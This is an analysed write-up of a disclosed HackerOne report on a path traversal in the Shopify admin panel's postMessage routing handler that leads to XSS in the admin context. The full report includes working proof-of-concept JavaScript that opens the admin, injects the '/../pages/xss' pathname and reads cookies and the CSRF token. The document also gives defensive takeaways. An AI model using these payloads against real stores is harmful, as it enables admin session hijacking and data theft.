# Page Injection in Admin Panel via Shopify.API.pushState Path Traversal

## Metadata
- **Source:** HackerOne
- **Report:** 662083 | https://hackerone.com/reports/662083
- **Submitted:** 2019-07-27
- **Reporter:** tiago-danin
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Path Traversal, Cross-Site Scripting (XSS), PostMessage API Abuse, Insecure Direct Object References
- **CVEs:** None
- **Category:** web-api

## Summary
The Shopify admin panel's `handleRoutePushEvent` method fails to properly validate the `pathname` parameter in `Shopify.API.pushState` calls, allowing path traversal via `..` sequences. An attacker can inject arbitrary pages from outside the admin panel into the admin frame, leading to XSS execution within the admin context with access to sensitive data like CSRF tokens and store configuration.

## Attack scenario
1. Attacker creates a malicious storefront page at `/pages/xss-play` containing JavaScript that opens the admin panel in a new window
2. When a store admin visits the attacker's page, the malicious script uses `window.postMessage()` to send messages to the admin window
3. The message invokes `Shopify.API.pushState` with a crafted `pathname` containing path traversal: `/../pages/xss`
4. The vulnerable `handleRoutePushEvent` concatenates `/admin` + `/../pages/xss`, resulting in `/pages/xss` instead of staying within `/admin`
5. The admin frame (`AppFrameMain`) loads the attacker-controlled `/pages/xss` page with XSS payload in the admin context
6. The XSS executes within the admin panel session, allowing extraction of CSRF tokens, cookies, and store configuration data

## Root cause
Insufficient input validation in the `handleRoutePushEvent` method. The code concatenates user-controlled `pathname` with the `adminPath` prefix without normalizing or validating against directory traversal patterns. The resulting path is used directly to navigate within the admin iframe without checking if it escapes the `/admin` boundary.

## Attacker mindset
An attacker seeks to compromise Shopify store admin accounts by leveraging trust in the storefront domain. By combining XSS on a storefront page with a path traversal vulnerability in the admin routing logic, they can execute arbitrary code within the admin session context, bypassing same-origin protections through the postMessage API. The goal is lateral privilege escalation and data exfiltration.

## Defensive takeaways
- Implement strict path validation in routing handlers: reject or normalize paths containing `..`, `./`, or other traversal patterns
- Use URL normalization libraries that resolve relative paths before validation (e.g., `new URL()` constructor with base)
- Enforce an allowlist of valid admin routes rather than constructing paths from user input
- Validate that resolved paths remain within expected boundaries (e.g., always start with `/admin`)
- Apply frame-ancestors CSP header to prevent admin panel embedding in cross-origin contexts
- Restrict postMessage listeners to only trusted origins and validate message structure/origin thoroughly
- Use secure navigation APIs that don't rely on string concatenation for path construction
- Implement Content Security Policy to prevent inline script execution
- Audit all postMessage handlers for similar path traversal or navigation vulnerabilities

## Variant hunting
Test other postMessage handlers in admin panel for similar path traversal issues
Check if `Shopify.API.pushState` accepts `hash` or `search` parameters that could bypass validation
Investigate whether encoded traversal patterns (`%2e%2e`, `..%00`) bypass the validation
Look for other routing methods or navigation APIs in admin that concatenate user input
Test if query parameters or fragments in pathname can inject additional navigation
Check if similar vulnerabilities exist in other Shopify admin features that use postMessage
Examine if the vulnerability applies to other admin subpages like `/admin/products`, `/admin/orders`

## MITRE ATT&CK
- T1190
- T1199
- T1021
- T1583
- T1587
- T1566
- T1204
- T1598

## Notes
The vulnerability requires user interaction (admin visiting attacker-controlled page) but leverages the admin's active session. The postMessage API allows cross-origin communication, making this a critical chain: XSS on storefront + path traversal in admin routing + session hijacking potential. Shopify's trust boundary between storefront and admin was exploited through improper path validation.

## Full report
<details><summary>Expand</summary>

# Summary
`Shopify.API.pushState` call the method `handleRoutePushEvent`, allows you to change routes to open pages from admin panel:
```js
handleRoutePushEvent({pathname: e, search: t, state: a, hash: o}) {
                const {adminPath: n, history: i} = this.props // `adminPath` = `/admin`
                  , s = "".concat(n).concat(e);
                // *** //
}
```
If we use the prefix `..` in `pathname` It will removes `admin` (`/admin/../pages/xss` ~> `/pages/xss`). You can load pages from outside the admin panel. The `document.getElementById("AppFrameMain")` will be modified with an insecure page.

## Step to Reproduce
1. Create an page with the XSS (title: xss, path: /pages/xss):
{F540958}
```html
<script>
alert("XSS By Tiago")
console.log("Document:", document)
console.log("Window:", window)
console.log("Cookies:", document.cookie)
console.log("Location:", window.location)
console.log("CSRF Token:", document.querySelectorAll('[data-serialized-id="csrf"]')[0].innerText)
</script>
```

2. Create another page with our triggered XSS (title: xss play, path: /pages/xss-play):
{F540963}
```html
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const data = JSON.stringify({
            message: 'Shopify.API.pushState',
            data: {pathname: "/../pages/xss"}
        });

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(data)
            }
        }, 500)
    }
    attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

3. Open the page https://[YOU_STORE].myshopify.com/pages/xss-play
4. Admin panel has been opened and script executed:
{F540964}

Tested with Google Chrome - Version 76.0.3788.1 (Official Build) dev (64-bit)

## Impact

Abuse the active admin session to extract data as:
- CSRF token.
- Store config.

</details>

---
*Analysed by Claude on 2026-05-24*
